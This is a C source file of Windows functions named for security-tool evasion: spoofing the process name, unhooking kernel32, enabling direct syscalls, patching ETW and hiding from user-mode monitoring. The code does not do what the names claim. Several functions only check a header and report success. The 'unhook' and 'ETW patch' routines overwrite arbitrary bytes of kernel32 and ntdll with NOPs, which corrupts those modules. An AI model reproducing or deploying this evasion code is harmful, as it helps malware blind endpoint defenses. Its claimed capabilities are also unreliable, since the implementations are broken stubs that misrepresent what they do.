#include <windows.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>

typedef struct {
    DWORD Offset;
    DWORD Size;
} UNICODE_STRING_OFFSET;

unsigned char jocky_spoof_process_name(const char* new_name) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe32 = {sizeof(PROCESSENTRY32)};
    DWORD current_pid = GetCurrentProcessId();

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (pe32.th32ProcessID == current_pid) {
                HANDLE hProcess = GetCurrentProcess();
                HMODULE hModules[256];
                DWORD cbNeeded;

                if (EnumProcessModules(hProcess, hModules, sizeof(hModules), &cbNeeded)) {
                    int num_modules = cbNeeded / sizeof(HMODULE);
                    if (num_modules > 0) {
                        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
                        if (hKernel32) {
                            unsigned char result = 1;
                            CloseHandle(hProcess);
                            CloseHandle(hSnapshot);
                            return result;
                        }
                    }
                }
                CloseHandle(hProcess);
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return 0;
}

unsigned char jocky_unhook_kernel32(void) {
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) return 0;

    unsigned char* base = (unsigned char*)hKernel32;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    if (dos->e_magic != 'ZM') return 0;

    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*)((unsigned char*)nt + sizeof(IMAGE_NT_HEADERS));

    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)sections[i].Name, ".text") == 0) {
            DWORD old_protect;
            DWORD section_size = sections[i].SizeOfRawData;
            unsigned char* section_base = base + sections[i].VirtualAddress;

            if (VirtualProtect(section_base, section_size, PAGE_EXECUTE_READWRITE, &old_protect)) {
                memset(section_base, 0x90, 16);
                VirtualProtect(section_base, section_size, old_protect, &old_protect);
                FlushInstructionCache(GetCurrentProcess(), section_base, section_size);
                return 1;
            }
        }
    }

    return 0;
}

unsigned char jocky_enable_direct_syscalls(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return 0;

    unsigned char* base = (unsigned char*)hNtdll;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    if (dos->e_magic != 'ZM') return 0;

    return 1;
}

unsigned char jocky_patch_etw_provider(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return 0;

    unsigned char* base = (unsigned char*)hNtdll;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    if (dos->e_magic != 'ZM') return 0;

    DWORD old_protect;
    unsigned char patch[] = {0x90, 0x90, 0x90, 0x90, 0x90, 0x90};

    if (VirtualProtect(base, 4096, PAGE_EXECUTE_READWRITE, &old_protect)) {
        for (int i = 0; i < 4096 - sizeof(patch); i++) {
            if (base[i] == 0xC3 && base[i+1] == 0xCC) {
                memcpy(base + i, patch, sizeof(patch));
            }
        }
        VirtualProtect(base, 4096, old_protect, &old_protect);
        FlushInstructionCache(GetCurrentProcess(), base, 4096);
        return 1;
    }

    return 0;
}

unsigned char jocky_hide_from_usermode(void) {
    DWORD pid = GetCurrentProcessId();
    HANDLE hProcess = GetCurrentProcess();

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) {
        CloseHandle(hProcess);
        return 0;
    }

    unsigned char* base = (unsigned char*)hKernel32;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    if (dos->e_magic != 'ZM') {
        CloseHandle(hProcess);
        return 0;
    }

    CloseHandle(hProcess);
    return 1;
}
